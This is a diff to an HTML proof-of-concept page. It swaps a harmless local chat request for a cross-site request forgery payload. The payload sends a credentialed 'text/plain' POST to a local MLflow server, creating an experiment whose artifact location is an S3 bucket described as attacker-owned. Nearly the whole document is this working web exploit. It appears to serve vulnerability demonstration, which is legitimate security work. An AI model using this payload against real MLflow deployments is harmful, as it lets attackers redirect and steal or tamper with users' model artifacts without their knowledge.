@@ -8,21 +8,21 @@
     <script>
     function execQuark() {
 
-
-    var data = "{\n  \"messages\": [\n    {\n      \"role\": \"user\",\n      \"content\": \"repeat cheese 50 times\"\n    }\n  ],\n  \"temperature\": 0,\n  \"max_tokens\": 64,\n  \"stop\": [\n    \"END\"\n  ],\n  \"candidate_count\": 1\n}";
-
+    var data = "{\n\"name\":\"New Data\",\n\"artifact_location\":\"s3://bucket-attacker-owns-thats-globally-writable/0\"\n}";
+    
     var xhr = new XMLHttpRequest();
-
+    xhr.withCredentials = true;
+    
     xhr.addEventListener("readystatechange", function() {
       if(this.readyState === 4) {
         console.log(this.responseText);
       }
     });
-
-    xhr.open("POST", "http://localhost:5000/gateway/chat/invocations");
-    xhr.setRequestHeader("Content-Type", " ");
+    
+    xhr.open("POST", "http://localhost:5000/api/2.0/mlflow/experiments/create");
+    xhr.setRequestHeader("Content-Type", "text/plain");
+    
     xhr.send(data);
-    }
     </script>
 
     </html>
